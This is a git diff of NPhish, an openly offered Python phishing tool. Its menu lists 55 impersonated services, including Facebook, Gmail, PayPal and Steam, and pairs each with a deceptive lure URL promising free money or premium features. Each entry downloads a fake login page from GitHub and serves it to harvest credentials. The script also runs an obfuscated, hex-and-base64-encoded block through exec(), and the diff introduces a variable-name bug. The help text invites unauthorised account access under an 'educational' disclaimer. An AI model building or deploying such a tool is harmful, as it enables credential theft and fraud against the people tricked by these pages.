@@ -1,9 +1,8 @@
 #!/usr/bin/python
-# -*- coding: UTF-8 -*-
 
 # ToolName   : NPhish
 # Author     : NISHANT
-# Version    : 2.0
+# Version    : 0.1.0
 # License    : MIT License
 # Copyright  : Nishant
 # Github     : https://github.com/Nishant2009
@@ -12,7 +11,29 @@
 # Language   : Python
 # If you copy open source code, then give credit
 
-import os, sys, time, socket
+
+#                                 MIT License
+#                        Copyright (c) 2022 Nishant2009
+
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
+import os, sys, time, socket, argparse
 from os import popen, system
 from time import sleep
 from subprocess import run
@@ -39,7 +60,7 @@ info= yellow + '[' + white + '+' + yellow + '] '+ cyan
 info2= green + '[' + white + '•' + green + '] '+ purple
 
 # VERSION
-version = "2.0"
+version = "0.1.0"
 
 # LOGO
 logo = """
@@ -71,28 +92,43 @@ NPhish += "\x56\x73\x49\x47\x4e\x76\x5a\x47\x55\x69"
 NPhish += "\x4b\x51\x6f\x67\x49\x43\x41\x67\x5a\x58"
 NPhish += "\x68\x70\x64\x43\x67\x70"
 
-sites = """[1] Facebook Traditional   [23] Ebay            [45] Yahoo
-[2] Facebook Voting        [24] Quora           [46] WordPress
-[3] Facebook Security      [25] Protonmail      [47] Yandex
-[4] Messenger              [26] Spotify         [48] StackOverflow
-[5] Instagram Traditional  [27] Reddit          [49] VK
-[6] Insta Auto Followers   [28] Adobe           [50] VK Poll
-[7] Insta 1000 Followers   [29] DevianArt       [51] Xbox
-[8] Insta Blue Verify      [30] Badoo           [52] Mediafire
-[9] Gmail Old              [31] Clash Of Clans  [53] Gitlab
-[10] Gmail New             [32] Ajio            [54] Github
-[11] Gmail Poll            [33] JioRouter       [55] Apple
-[12] Microsoft             [34] FreeFire        [56] iCloud
-[13] Netflix               [35] Pubg            [57] Shopify
-[14] Paypal                [36] Telegram        [58] Myspace
-[15] Steam                 [37] Youtube         [59] Shopping
-[16] Twitter               [38] Airtel          [60] Cryptocurrency
-[17] PlayStation           [39] SocialClub      [61] SnapChat2
-[18] TikTok                [40] Ola             [62] Verizon
-[19] Twitch                [41] Outlook         [63] Wi-Fi
-[20] Pinterest             [42] Amazon          [64] Discord
-[21] SnapChat              [43] Origin          [65] Roblox
-[22] LinkedIn              [44] DropBox         [c] Custom "
+sites = """[1] Facebook                [20] Reddit           [38] WordPress
+
+[2] Messenger               [21] Adobe            [39] Yandex
+
+[3] Instagram               [22] DevianArt        [40] StackOverflow
+
+[4] Google                  [23] Badoo            [41] VK
+
+[5] Microsoft               [24] Clash Of Clans   [42] Xbox
+
+[6] Netflix                 [25] Ajio             [43] Mediafire
+
+[7] Paypal                  [26] JioRouter        [44] Gitlab
+
+[8] Steam                   [27] FreeFire         [45] Github
+
+[9] Twitter                 [28] Pubg             [46] Apple
+
+[10] PlayStation            [29] Telegram         [47] iCloud
+
+[11] TikTok                 [30] Airtel           [48] Shopify
+
+[12] Twitch                 [31] SocialClub       [49] Myspace
+
+[13] Pinterest              [32] Ola              [50] Shopping
+
+[14] SnapChat               [33] Outlook          [51] Cryptocurrency
+
+[15] LinkedIn               [34] Amazon           [52] Verizon
+
+[16] Ebay                   [35] Origin           [53] Wi-Fi
+
+[17] Quora                  [36] DropBox          [54] Discord
+
+[18] Protonmail             [37] Yahoo            [55] Roblox
+
+[19] Spotify                [38] WordPress        [56] Custom
 """
 # CHECK HOME DIRECTORY
 exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(NPhish.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
@@ -189,7 +225,7 @@ def line_print(n):
 # CHECK AND INSTALL LOLCAT(FOR COLOUR PRINT)
 if system("command -v lolcat > /dev/null 2>&1")!=0:
     line_print("\n"+info+"Installing LOLCAT"+nc)
-    system("pip install git+https://github.com/Nishant 2009/lolcat.git;clear")
+    system("pip install git+https://github.com/Nishant2009/lolcat.git;clear")
 
 # UPDATE
 def update():
@@ -243,16 +279,20 @@ def exit_msg():
     line_print("\n"+info2+bgreen+"Thanks for using NPhish!\n"+nc)
     exit(0)
 
+# COLOUR PRINT
+def colour_print(n):
+    print(run(['lolcat'],input = n, capture_output = True, text = True ).stdout)
+
 # ABOUT
 def about():
     system("clear")
     logo_print(bgreen + logo)
-    About = "ToolName             :NPhish\nVersion              :"+version+"\nAuthor               :Nishant\nGithub               :https://github.com/Nishant2009\nTelegram Channel     :https://t.me/lets_do_hacking\nInstagram            :nishant._pratap"
+    About = "ToolName             :NPhish\nVersion              :"+version+"\nAuthor               :Nishant\nGithub               :https://github.com/Nishant2009\nTelegram Channel     :https://t.me/lets_do_hacking\n"
     print(run(['lolcat'],input = About, capture_output = True, text = True ).stdout)
     print()
     print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+blue+'  Main Menu       ')
     print()
-    abot= input("\n > ")
+    about= input("\n > ")
     if abot== "0":
         exit_msg()
     else:
@@ -392,266 +432,305 @@ def main():
         options()
         choose= input(ask+"Select one of the options > "+nc)
         if choose=="1" or choose == "01":
-            folder="facebook"
-            mask="https://blue-verified-facebook-free"
-            requirements(folder,mask)
+            colour_print("\n[1] Facebook Traditional\n[2] Facebook Voting\n[3] Facebook Security\n[99] Main Menu\n[0]Exit\n\n\n")
+            select= input(ask+"Select one of the options > "+nc)
+            if select =="1" or select == "01":
+                folder="facebook"
+                mask="https://blue-verified-facebook-free"
+                requirements(folder,mask)
+            elif select == "2" or select == "02":
+                folder="fb_advanced"
+                mask='https://vote-for-the-best-social-media'
+                requirements(folder,mask)
+            elif select == "3" or select == "03":
+                folder="fb_security"
+                mask='https://make-your-facebook-secured-and-free-from-hackers'
+                requirements(folder,mask)
+            elif select == "4" or select == "04":
+                folder="fb_messenger"
+                mask='https://get-messenger-premium-features-free'
+                requirements(folder,mask)
+            elif select == "0" or select=="00":
+                exit()
+            else:
+                main()
         elif choose == "2" or choose == "02":
-            folder="fb_advanced"
-            mask='https://vote-for-the-best-social-media'
-            requirements(folder,mask)
-        elif choose == "3" or choose == "03":
-            folder="fb_security"
-            mask='https://make-your-facebook-secured-and-free-from-hackers'
-            requirements(folder,mask)
-        elif choose == "4" or choose == "04":
             folder="fb_messenger"
             mask='https://get-messenger-premium-features-free'
             requirements(folder,mask)
-        elif choose == "5" or choose == "05":
-            folder="instagram"
-            mask='https://get-unlimited-followers-for-instagram'
-            requirements(folder,mask)
-        elif choose == "6" or choose== "06":
-            folder="ig_followers"
-            mask='https://get-unlimited-followers-for-instagram'
-            requirements(folder,mask)
-        elif choose == "7" or choose == "07":
-            folder="insta_followers"
-            mask='https://get-1000-followers-for-instagram'
-            requirements(folder,mask)
-        elif choose == "8" or choose == "08":
-            folder="ig_verify"
-            mask='https://blue-badge-verify-for-instagram-free'
-            requirements(folder,mask)
-        elif choose == "9" or choose == "09":
-            folder="google"
-            mask='https://get-unlimited-google-drive-free'
-            requirements(folder,mask)
-        elif choose == "10":
-            folder="google_new"
-            mask='https://get-unlimited-google-drive-free'
-            requirements(folder,mask)
-        elif choose == "11":
-            folder="google_poll"
-            mask='https://vote-for-the-best-social-media'
-            requirements(folder,mask)
-        elif choose == "12":
+        elif choose == "3" or choose == "03":
+            colour_print("\n[1] Instagram Traditional\n[2] Insta Auto Followers\n[3] Insta 1000 Followers\n[4] Insta Blue Verify\n[99] Main Menu\n[0]Exit\n\n\n")
+            select= input(ask+"Select one of the options > "+nc)
+            if select =="1" or select == "01":
+                folder="instagram"
+                mask='https://get-unlimited-followers-for-instagram'
+                requirements(folder,mask)
+            elif select == "2" or select== "02":
+                folder="ig_followers"
+                mask='https://get-unlimited-followers-for-instagram'
+                requirements(folder,mask)
+            elif select == "3" or select == "03":
+                folder="insta_followers"
+                mask='https://get-1000-followers-for-instagram'
+                requirements(folder,mask)
+            elif select == "4" or select == "04":
+                folder="ig_verify"
+                mask='https://blue-badge-verify-for-instagram-free'
+                requirements(folder,mask)
+            elif select == "0" or select=="00":
+                exit()
+            else:
+                main()
+        elif choose=="4" or choose == "04":
+            colour_print("\n[1] Gmail Old\n[2] Gmail New\n[3] Gmail Poll\n[4] Youtube\n[99] Main Menu\n[0]Exit\n\n\n")
+            select= input(ask+"Select one of the options > "+nc)
+            if select =="1" or select == "01":
+                folder="google"
+                mask='https://get-unlimited-google-drive-free'
+                requirements(folder,mask)
+            elif select =="2" or select == "02":
+                folder="google_new"
+                mask='https://get-unlimited-google-drive-free'
+                requirements(folder,mask)
+            elif select == "3" or select == "03":
+                folder="google_poll"
+                mask='https://vote-for-the-best-social-media'
+                requirements(folder,mask)
+            elif select == "4" or select =="04":
+                folder="youtube"
+                mask='https://get-1k-like-in-any-video'
+                requirements(folder,mask)
+            elif select == "0" or select=="00":
+                exit()
+            else:
+                main()
+        elif choose=="5" or choose=="05":
             folder="microsoft"
             mask='https://unlimited-onedrive-space-for-free'
             requirements(folder,mask)
-        elif choose == "13":
+        elif choose=="6" or choose=="06":
             folder="netflix"
             mask='https://upgrade-your-netflix-plan-free'
             requirements(folder,mask)
-        elif choose == "14":
+        elif choose=="7" or choose=="07":
             folder="paypal"
             mask='https://get-500-usd-free-to-your-account'
             requirements(folder,mask)
-        elif choose == "15":
+        elif choose=="8" or choose=="08":
             folder="steam"
             mask='https://steam-500-usd-gift-card-free'
             requirements(folder,mask)
-        elif choose == "16":
+        elif choose=="9" or choose=="09":
             folder="twitter"
             mask='https://get-blue-badge-on-twitter-free'
             requirements(folder,mask)
-        elif choose == "17":
+        elif choose=="10":
             folder="playstation"
             mask='https://playstation-500-usd-gift-card-free'
             requirements(folder,mask)
-        elif choose == "18":
+        elif choose=="11":
             folder="tiktok"
             mask='https://tiktok-free-liker'
             requirements(folder,mask)
-        elif choose == "19":
+        elif choose=="12":
             folder="twitch"
             mask='https://unlimited-twitch-tv-user-for-free'
             requirements(folder,mask)
-        elif choose == "20":
+        elif choose=="13":
             folder="pinterest"
             mask='https://get-a-premium-plan-for-pinterest-free'
             requirements(folder,mask)
-        elif choose == "21":
-            folder="snapchat"
-            mask='https://view-locked-snapchat-accounts-secretly'
-            requirements(folder,mask)
-        elif choose == "22":
+        elif choose=="14":
+            colour_print("\n[1] SnapChat 1\n[2] Snapchat 2\n[99] Main Menu\n[0] Exit")
+            select= input(ask+"Select one of the options > "+nc)
+            if select =="1" or select == "01":
+                folder="snapchat"
+                mask='https://view-locked-snapchat-accounts-secretly'
+                requirements(folder,mask)
+            elif select == "2" or select =="02":
+                folder="snapchat2"
+                mask='https://view-locked-snapchat-accounts-secretly'
+                requirements(folder,mask)
+            elif select == "0" or select=="00":
+                exit()
+            else:
+                main()
+        elif choose=="15":
             folder="linkedin"
             mask='https://get-a-premium-plan-for-linkedin-free'
             requirements(folder,mask)
-        elif choose == "23":
+        elif choose=="16":
             folder="ebay"
             mask='https://get-500-usd-free-to-your-account'
             requirements(folder,mask)
-        elif choose == "24":
+        elif choose=="17":
             folder="quora"
             mask='https://quora-premium-for-free'
             requirements(folder,mask)
-        elif choose == "25":
+        elif choose=="18":
             folder="protonmail"
             mask='https://protonmail-pro-basics-for-free'
             requirements(folder,mask)
-        elif choose == "26":
+        elif choose=="19":
             folder="spotify"
             mask='https://convert-your-account-to-spotify-premium'
             requirements(folder,mask)
-        elif choose == "27":
+        elif choose=="20":
             folder="reddit"
             mask='https://reddit-official-verified-member-badge'
             requirements(folder,mask)
-        elif choose == "28":
+        elif choose=="21":
             folder="adobe"
             mask='https://get-adobe-lifetime-pro-membership-free'
             requirements(folder,mask)
-        elif choose == "29":
+        elif choose=="22":
             folder="deviantart"
             mask='https://get-500-usd-free-to-your-acount'
             requirements(folder,mask)
-        elif choose == "30":
+        elif choose=="23":
             folder="badoo"
             mask='https://get-500-usd-free-to-your-acount'
             requirements(folder,mask)
-        elif choose == "31":
+        elif choose=="24":
             folder="clashofclans"
             mask='https://get-unlimited-gems-in-your-coc-account'
             requirements(folder,mask)
-        elif choose == "32":
+        elif choose=="25":
             folder="ajio"
             mask='https://get-limited-time-discount'
             requirements(folder,mask)
-        elif choose == "33":
+        elif choose=="26":
             folder="jiorouter"
             mask='https://get-premium-membership-free'
             requirements(folder,mask)
-        elif choose == "34":
+        elif choose=="27":
             folder="freefire"
             mask='https://get-unlimited-diamonds-in-your-ff-account'
             requirements(folder,mask)
-        elif choose == "35":
+        elif choose == "28":
             folder="pubg"
             mask='https://get-unlimited-diamonds-in-your-pubg-account'
             requirements(folder,mask)
-        elif choose == "36":
+        elif choose == "29":
             folder="telegram"
             mask='https://get-premium-membership-free'
             requirements(folder,mask)
-        elif choose == "37":
-            folder="youtube"
-            mask='https://get-1k-like-in-any-video'
-            requirements(folder,mask)
-        elif choose == "38":
+        elif choose == "30":
             folder="airtelsim"
             mask='https://get-500-cureency-free-to-your-account'
             requirements(folder,mask)
-        elif choose == "39":
+        elif choose == "31":
             folder="socialclub"
             mask='https://get-premium-membership-free'
             requirements(folder,mask)
-        elif choose == "40":
+        elif choose == "32":
             folder="ola"
             mask='https://book-a-cab-in-discount'
             requirements(folder,mask)
-        elif choose == "41":
+        elif choose == "33":
             folder="outlook"
             mask='https://grab-mail-from-anyother-outlook-account-free'
             requirements(folder,mask)
-        elif choose == "42":
+        elif choose == "34":
             folder="amazon"
             mask='https://get-limited-time-discount-free'
             requirements(folder,mask)
-        elif choose == "43":
+        elif choose == "35":
             folder="origin"
             mask='https://get-500-usd-free-to-your-acount'
             requirements(folder,mask)
-        elif choose == "44":
+        elif choose == "36":
             folder="dropbox"
             mask='https://get-1TB-cloud-storage-free'
             requirements(folder,mask)
-        elif choose == "45":
+        elif choose == "37":
             folder="yahoo"
             mask='https://grab-mail-from-anyother-yahoo-account-free'
             requirements(folder,mask)
-        elif choose == "46":
+        elif choose == "38":
             folder="wordpress"
             mask='https://unlimited-wordpress-traffic-free'
             requirements(folder,mask)
-        elif choose == "47":
+        elif choose == "39":
             folder="yandex"
             mask='https://grab-mail-from-anyother-yandex-account-free'
             requirements(folder,mask)
-        elif choose == "48":
+        elif choose == "40":
             folder="stackoverflow"
             mask='https://get-stackoverflow-lifetime-pro-membership-free'
             requirements(folder,mask)
-        elif choose == "49":
-            folder="vk"
-            mask='https://vk-premium-real-method-2020'
-            requirements(folder,mask)
-        elif choose == "50":
-            folder="vk_pole"
-            mask='https://vote-for-the-best-social-media'
-            requirements(folder,mask)
-        elif choose == "51":
+        elif choose=="41":
+            colour_print("\n[1] VK\n[2]VK Poll\n[99] Main Menu\n[0]Exit\n\n\n")
+            select= input(ask+"Select one of the options > "+nc)
+            if select =="1" or select == "01":
+                folder="vk"
+                mask='https://vk-premium-real-method-2020'
+                requirements(folder,mask)
+            elif select=="2" or select=="02":
+                folder="vk_pole"
+                mask='https://vote-for-the-best-social-media'
+                requirements(folder,mask)
+            elif select == "0" or select=="00":
+                exit()
+            else:
+                main()
+        elif choose=="42":
             folder="xbox"
             mask='https://get-500-usd-free-to-your-acount'
             requirements(folder,mask)
-        elif choose == "52":
+        elif choose=="43":
             folder="mediafire"
             mask='https://get-1TB-on-mediafire-free'
             requirements(folder,mask)
-        elif choose == "53":
+        elif choose=="44":
             folder="gitlab"
             mask='https://get-1k-followers-on-gitlab-free'
             requirements(folder,mask)
-        elif choose == "54":
+        elif choose == "45":
             folder="github"
             mask='https://get-1k-followers-on-github-free'
             requirements(folder,mask)
-        elif choose == "55":
+        elif choose == "46":
             folder="apple"
             mask='https://get-apple-premium-account-free'
             requirements(folder,mask)
-        elif choose == "56":
+        elif choose == "47":
             folder="icloud"
             mask='https://unlimited-storage-icloud-free'
             requirements(folder,mask)
-        elif choose == "57":
+        elif choose == "48":
             folder="shopify"
             mask='https://get-50%-discount-on-any-sale'
             requirements(folder,mask)
-        elif choose == "58":
+        elif choose == "49":
             folder="myspace"
             mask='https://get-1k-followers-on-myspace-free-free'
             requirements(folder,mask)
-        elif choose == "59":
+        elif choose == "50":
             folder="shopping"
             mask='https://get-50%-discount-on-any-sale'
             requirements(folder,mask)
-        elif choose == "60":
+        elif choose == "51":
             folder="cryptocurrency"
             mask='https://get-bitcoins-free'
             requirements(folder,mask)
-        elif choose == "61":
-            folder="snapchat2"
-            mask='https://view-locked-snapchat-accounts-secretly'
-            requirements(folder,mask)
-        elif choose == "62":
+        elif choose=="52":
             folder="verizon"
             mask='https://get-verizon-premium-account-free'
             requirements(folder,mask)
-        elif choose == "63":
+        elif choose == "53":
             folder="wifi"
             mask='https://reconnect-your-wifi'
             requirements(folder,mask)
-        elif choose == "64":
+        elif choose == "54":
             folder="discord"
             mask='https://security-bot-for-your-discord-free'
             requirements(folder,mask)
-        elif choose == "65":
+        elif choose == "55":
             folder="roblox"
             mask='https://play-premium-games-for-free'
             requirements(folder,mask)
-        elif choose == "c" or choose == "C":
+        elif choose == "56":
             customdir()
         elif choose == "x" or choose == "X":
             about()
@@ -678,19 +757,19 @@ def customdir():
 # DOWNLOADING SITE FOLDER 
 def requirements(folder,mask):
     while True:
-        if os.path.exists(root+"/.website/"+folder):
-            system("cp -r $HOME/.website/"+folder+"/* $HOME/.site")
+        if os.path.exists(root+"/.websites/"+folder):
+            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
             break
         else:
             check_intr()
             line_print("\n"+info+"Downloading required files.....\n")
-            system("rm -rf website.zip")
-            system("wget -q --show-progress https://github.com/Nishant2009/NPhish/raw/main/Websites/"+folder+".zip -O website.zip")
+            check_intr()
+            system(f"wget -q --show-progress https://github.com/Nishant2009/NPhish/raw/main/Websites/{folder}.zip -O websites.zip")
             if not os.path.exists(root+"/.websites"):
                 system("cd $HOME && mkdir .websites")
             system("cd $HOME/.websites && mkdir "+folder)
-            system("unzip website.zip -d $HOME/.websites/"+folder+" > /dev/null 2>&1")
-            os.remove("website.zip")
+            system(f"unzip websites.zip -d $HOME/.websites/{folder}  > /dev/null 2>&1 ")
+            os.remove("websites.zip")
             system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
             break
     with open(".info.txt", "w") as inform:
@@ -871,10 +950,30 @@ def get_credentials():
     except KeyboardInterrupt:
         exit_msg()
 
+description = yellow + """Ultimate phishing tool in python. Includes popular websites like facebook, twitter, instagram, github, reddit, gmail and many others.
+\n\nThis tool is developed for educational purposes. Here it demonstrates how phishing works. If anybody wants to gain unauthorized access to someones social media, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of NPhish!
+""" + nc
+
+parser = argparse.ArgumentParser(description=description,
+                                 epilog='Coded by Nishant !!!')
+parser.add_argument("-u", "--update", action="store_true",
+                    help="update NPhish")
+parser.add_argument("-c", "--contributors", action="store_true",
+                    help="show current NPhish contributors")
+parser.add_argument("-v", "--version", action="store_true",
+                    help="show current NPhish version")
+
 if __name__ == '__main__':
-    try:
-        os.system("stty -echoctl")
+    args = parser.parse_args()
+    if args.version:
+        print("Version: ", version)
+    elif args.contributors:
+        print("Contributors: NISHANT")
+    elif args.update:
         update()
-        main()
-    except KeyboardInterrupt:
-        exit_msg()
+    else:
+        try:
+            update()
+            main()
+        except KeyboardInterrupt:
+            exit_msg()
